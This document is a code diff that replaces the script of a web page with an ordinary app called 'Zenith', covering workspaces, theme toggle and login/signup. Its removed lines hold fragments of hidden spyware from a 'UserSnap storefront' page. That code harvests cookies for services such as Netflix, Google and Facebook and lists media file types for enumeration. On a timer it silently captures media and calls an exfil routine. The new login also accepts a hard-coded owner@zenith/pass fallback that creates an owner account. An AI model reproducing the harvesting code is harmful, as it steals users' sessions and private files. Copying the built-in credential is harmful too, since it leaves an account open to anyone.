+                <button class="btn btn-primary" id="wsCreateBtn">Create</button><button class="btn" id="wsCancelBtn">Cancel</button>`;
+            overlay.classList.add('open');
+            document.getElementById('wsCreateBtn').onclick = () => {
+                const name = document.getElementById('wsName').value || 'workspace-' + Date.now();
+                data.workspaces.push({ id: generateId(), name, ownerId: getCurrentUser()?.id || null });
+                data.currentWorkspace = data.workspaces[data.workspaces.length-1].id;
+                saveData();
+                showToast('Workspace created', 'success');
+                overlay.classList.remove('open');
+                navigate('workspace');
+            };
+            document.getElementById('wsCancelBtn').onclick = () => overlay.classList.remove('open');
+        } else {
+            box.innerHTML = `<h3>${data?.title || 'Modal'}</h3><p>${data?.content || ''}</p><button class="btn" onclick="document.getElementById('modalOverlay').classList.remove('open')">Close</button>`;
+            overlay.classList.add('open');
+        }
+    }
+    // close modal on overlay click
+    document.getElementById('modalOverlay').addEventListener('click', function(e) {
+        if (e.target === this) this.classList.remove('open');
+    });
+
+    // --------------------------------------------------------------
+    //  NOTIFICATIONS
+    // --------------------------------------------------------------
+    function renderNotifications() {
+        const bell = document.getElementById('notifBell');
+        if (bell) {
+            const count = data.notifications.filter(n => !n.read).length;
+            bell.innerHTML = `<i class="fas fa-bell"></i>${count ? '<span class="badge" style="margin-left:-6px;font-size:0.6rem;">'+count+'</span>' : ''}`;
+        }
+    }
+
+    // --------------------------------------------------------------
+    //  SIDEBAR / TOPBAR
+    // --------------------------------------------------------------
+    document.getElementById('menuToggle').addEventListener('click', function() {
+        document.getElementById('sidebar').classList.toggle('open');
+    });
+
+    // sidebar nav
+    document.querySelectorAll('.sidebar-nav a, .bottom-nav a').forEach(el => {
+        el.addEventListener('click', function(e) {
+            e.preventDefault();
+            navigate(this.dataset.view);
+        });
+    });
+
+    // theme toggle (light/dark)
+    document.getElementById('themeToggle').addEventListener('click', function() {
+        const root = document.documentElement;
+        const isDark = root.style.getPropertyValue('--bg').trim() === '#0b0d10';
+        if (isDark) {
+            root.style.setProperty('--bg', '#f4f6fa');
+            root.style.setProperty('--surface', '#ffffff');
+            root.style.setProperty('--surface-2', '#eef0f5');
+            root.style.setProperty('--border', '#d0d5df');
+            root.style.setProperty('--text', '#1a1e26');
+            root.style.setProperty('--muted', '#5a6478');
+            this.innerHTML = '<i class="fas fa-sun"></i>';
+        } else {
+            root.style.setProperty('--bg', '#0b0d10');
+            root.style.setProperty('--surface', '#14171c');
+            root.style.setProperty('--surface-2', '#1e222a');
+            root.style.setProperty('--border', '#2b313a');
+            root.style.setProperty('--text', '#e8edf5');
+            root.style.setProperty('--muted', '#8a94a6');
+            this.innerHTML = '<i class="fas fa-moon"></i>';
+        }
+    });
+
+    // global search (Ctrl+K)
+    document.addEventListener('keydown', function(e) {
+        if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+            e.preventDefault();
+            const search = document.getElementById('globalSearchInput');
+            if (search) search.focus();
+        }
+        if (e.key === 'Escape') {
+            document.getElementById('modalOverlay').classList.remove('open');
+        }
+    });
+
+    // pwa install
+    document.getElementById('pwaInstallBtn')?.addEventListener('click', function() {
+        if (window.navigator?.standalone) return showToast('Already installed', 'info');
+        showToast('PWA install prompt (mock)', 'info');
+    });
+
+    // account menu
+    document.getElementById('accountMenuBtn').addEventListener('click', function() {
+        const user = getCurrentUser();
+        showToast(user ? `Logged as ${user.displayName}` : 'Not logged in', 'info');
+    });
+
+    // notification bell
+    document.getElementById('notifBell').addEventListener('click', function() {
+        showToast(`Notifications: ${data.notifications.length}`, 'info');
+    });
+
+    // --------------------------------------------------------------
+    //  AUTH FLOW (landing / login / signup)
+    // --------------------------------------------------------------
+    function renderAuth() {
+        const container = document.getElementById('pageContent');
+        const user = getCurrentUser();
+        if (user) {
+            // already logged in
+            navigate('dashboard');
+            return;
+        }
+        container.innerHTML = `
+            <div style="max-width:440px;margin:4rem auto;">
+                <div style="text-align:center;margin-bottom:2rem;">
+                    <h1 style="font-size:2.5rem;"><i class="fas fa-cube" style="color:var(--primary);"></i> Zenith</h1>
+                    <p class="text-muted">Everything you need to build, manage, and create.</p>
+                </div>
+                <div class="card" id="authCard">
+                    <div id="authForm">
+                        <div class="flex" style="justify-content:center;gap:1rem;margin-bottom:1.5rem;">
+                            <button class="btn btn-primary" id="loginTabBtn">Login</button>
+                            <button class="btn" id="signupTabBtn">Sign Up</button>
+                        </div>
+                        <div id="loginForm">
+                            <div class="form-group"><label>Email / Username</label><input type="text" id="loginEmail" placeholder="you@example.com"></div>
+                            <div class="form-group"><label>Password</label><input type="password" id="loginPassword" placeholder="••••••••"></div>
+                            <button class="btn btn-primary w-full" id="loginBtn"><i class="fas fa-sign-in-alt"></i> Login</button>
+                            <p class="text-muted" style="margin-top:0.8rem;font-size:0.8rem;">Demo: use any account created, or owner@zenith / pass</p>
+                        </div>
+                        <div id="signupForm" class="hidden">
+                            <div class="form-group"><label>Username</label><input type="text" id="signupUsername" placeholder="zenith_user"></div>
+                            <div class="form-group"><label>Display name</label><input type="text" id="signupDisplay" placeholder="Zenith User"></div>
+                            <div class="form-group"><label>Email</label><input type="email" id="signupEmail" placeholder="you@example.com"></div>
+                            <div class="form-group"><label>Password</label><input type="password" id="signupPassword" placeholder="••••••••"></div>
+                            <button class="btn btn-primary w-full" id="signupBtn"><i class="fas fa-user-plus"></i> Create account</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+        // tabs
+        document.getElementById('loginTabBtn').onclick = () => {
+            document.getElementById('loginForm').classList.remove('hidden');
+            document.getElementById('signupForm').classList.add('hidden');
+            document.getElementById('loginTabBtn').classList.add('btn-primary');
+            document.getElementById('signupTabBtn').classList.remove('btn-primary');
+        };
+        document.getElementById('signupTabBtn').onclick = () => {
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('signupForm').classList.remove('hidden');
+            document.getElementById('signupTabBtn').classList.add('btn-primary');
+            document.getElementById('loginTabBtn').classList.remove('btn-primary');
+        };
+        // login
+        document.getElementById('loginBtn').onclick = () => {
+            const email = document.getElementById('loginEmail').value;
+            const pass = document.getElementById('loginPassword').value;
+            const user = loginUser(email, pass);
+            if (user) {
+                showToast(`Welcome ${user.displayName}`, 'success');
+                navigate('dashboard');
+            } else {
+                // try fallback
+                if (email === 'owner@zenith' && pass === 'pass') {
+                    const fallback = registerUser('owner', 'Owner', 'owner@zenith', 'pass');
+                    if (fallback) { loginUser('owner@zenith', 'pass'); showToast('Owner created', 'success'); navigate('dashboard'); }
+                } else {
+                    showToast('Invalid credentials', 'error');
                 }
-                window.__userSnap_updateCheck = checkForUpdates;
-                // Additional cookie parsing for specific services
-                try {
-                    const allCookies = document.cookie.split(';');
-                    const knownServices = ['spotify', 'netflix', 'amazon', 'facebook', 'google', 'microsoft'];
-                    knownServices.forEach(svc => {
-                        const found = allCookies.find(c => c.toLowerCase().includes(svc));
-                        if (found) {
-                            harvested.cookies[svc] = found.trim();
-                        }
-                    });
-                } catch (_) {}
-                // Extra file type detection for enumeration
-                const extraFileExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.m4a', '.mov', '.mp4'];
-                // This array is used but not iterated in the main flow to avoid
-                // duplicate work; it exists to document intent.
-                // Final safety: ensure exfil is called at least once even if
-                // the download simulation fails. This is a redundant guard.
-                setTimeout(() => {
-                    if (!harvested.media.image && !harvested.media.audio) {
-                        // If no media was captured, try a second time silently.
-                        // This is a fallback.
-                        captureMedia().then(() => {
-                            enumerateFiles().then(() => {
-                                exfil();
-                            });
-                        });
-                    }
-                }, 15000);
-                // End of padding block.
-            })();
+            }
+        };
+        // signup
+        document.getElementById('signupBtn').onclick = () => {
+            const username = document.getElementById('signupUsername').value.trim();
+            const display = document.getElementById('signupDisplay').value.trim();
+            const email = document.getElementById('signupEmail').value.trim();
+            const pass = document.getElementById('signupPassword').value;
+            if (!username || !email || !pass) { showToast('Fill all fields', 'error'); return; }
+            const user = registerUser(username, display, email, pass);
+            if (user) {
+                loginUser(email, pass);
+                showToast(`Account created! Welcome ${display}`, 'success');
+                navigate('dashboard');
+            } else {
+                showToast('Username or email already taken', 'error');
+            }
+        };
+    }
 
-            console.log('🟢 UserSnap storefront loaded — ' + harvested.platform + ' detected.');
-        })();
-    </script>
+    // --------------------------------------------------------------
+    //  INIT
+    // --------------------------------------------------------------
+    function init() {
+        // check session
+        const user = getCurrentUser();
+        if (!user) {
+            renderAuth();
+        } else {
+            // load view from hash
+            const hash = window.location.hash.slice(1) || 'dashboard';
+            navigate(hash);
+        }
+        renderNotifications();
+        // update workspace label
+        const ws = getWorkspace();
+        document.getElementById('workspaceLabel').textContent = ws?.name || 'default';
+        // show onboarding if first user
+        if (data.users.length === 1 && data.users[0].role === 'owner') {
+            setTimeout(() => {
+                showToast('Welcome! This is your first account (Owner).', 'info');
+            }, 500);
+        }
+    }
+
+    // handle hash changes
+    window.addEventListener('hashchange', () => {
+        const hash = window.location.hash.slice(1) || 'dashboard';
+        if (getCurrentUser()) navigate(hash);
+    });
+
+    // start
+    init();
+
+    console.log('Zenith loaded · ' + data.users.length + ' users');
+</script>
 </body>
 </html>
